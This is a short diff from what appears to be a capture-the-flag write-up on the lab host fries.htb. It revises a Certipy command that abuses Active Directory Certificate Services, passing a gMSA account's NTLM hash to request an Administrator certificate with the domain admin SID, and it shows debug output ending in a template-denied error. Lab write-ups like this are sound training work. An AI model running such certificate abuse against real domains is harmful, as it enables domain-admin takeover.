@@ -1120,15 +1120,29 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Then ill need the domain admins SID 
 
 ```python
-certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-ip '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -template 'SubCA' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
+certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-ip '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -template 'SubCA' -upn 'Administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -debug
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.129.244.72'
+[+] DC IP: '10.129.244.72'
+[+] DC Host: 'FRIES.HTB'
+[+] Target IP: None
+[+] Remote Name: 'dc01.fries.htb'
+[+] Domain: 'FRIES.HTB'
+[+] Username: 'GMSA_CA_PROD$'
+[+] Trying to resolve 'dc01.fries.htb' at '10.129.244.72'
+[+] Generating RSA key
 [*] Requesting certificate via RPC
-[*] Request ID is 43
+[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[*] Request ID is 44
 [-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
 Would you like to save the private key? (y/N): y
-[*] Saving private key to '43.key'
-[*] Wrote private key to '43.key'
+[*] Saving private key to '44.key'
+[+] Attempting to write data to '44.key'
+[+] Data written to '44.key'
+[*] Wrote private key to '44.key'
 [-] Failed to request certificate
 ```
 
